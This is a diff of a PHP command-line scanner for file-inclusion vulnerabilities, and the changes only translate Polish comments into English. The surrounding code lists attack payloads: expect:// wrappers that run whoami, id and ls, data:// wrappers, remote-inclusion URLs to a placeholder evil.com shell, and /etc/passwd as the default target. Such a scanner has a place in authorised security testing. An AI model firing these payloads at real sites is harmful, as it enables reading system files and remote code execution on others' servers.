@@ -13,7 +13,6 @@ class LFIWrapperScanner {
     }
     
     private function detectProxy() {
-        // Sprawdzanie zmiennych środowiskowych proxy
         $proxyEnvVars = ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy'];
         foreach ($proxyEnvVars as $envVar) {
             if ($proxy = getenv($envVar)) {
@@ -107,7 +106,7 @@ class LFIWrapperScanner {
             }
         }
         
-        // Data wrapper (dla PHP < 8.0)
+        // Data wrapper (PHP < 8.0)
         $dataWrappers = [
             'data://text/plain;base64,',
             'data://text/plain,',
@@ -119,12 +118,12 @@ class LFIWrapperScanner {
             $wrappers[] = $wrapper . $testContent;
         }
         
-        // Expect wrapper (jeśli allow_url_include=1)
+        // Expect wrapper (if allow_url_include=1)
         $wrappers[] = 'expect://whoami';
         $wrappers[] = 'expect://id';
         $wrappers[] = 'expect://ls';
         
-        // HTTP wrapper (dla testów RFI)
+        // HTTP wrapper (RFI)
         $wrappers[] = 'http://evil.com/shell.txt';
         $wrappers[] = 'https://raw.githubusercontent.com/evil/shell/master/shell.php';
         
@@ -149,7 +148,6 @@ class LFIWrapperScanner {
             CURLOPT_HEADER => true,
         ];
         
-        // Dodaj proxy jeśli jest skonfigurowane
         if ($this->proxy) {
             $curlOptions[CURLOPT_PROXY] = $this->proxy;
             $curlOptions[CURLOPT_HTTPPROXYTUNNEL] = true;
@@ -210,7 +208,7 @@ class LFIWrapperScanner {
         }
         echo str_repeat("-", 80) . "\n";
         
-        // Test połączenia
+        // test connection (single)
         $this->printStatus("Testing connection to target...", 'testing');
         $testResponse = $this->testUrl($targetUrl);
         
@@ -329,7 +327,7 @@ if (php_sapi_name() !== 'cli') {
 $scanner = new LFIWrapperScanner();
 $scanner->showBanner();
 
-// Parsowanie argumentów
+// parse arguments
 $targetUrl = null;
 $parameter = null;
 $testFile = '/etc/passwd';
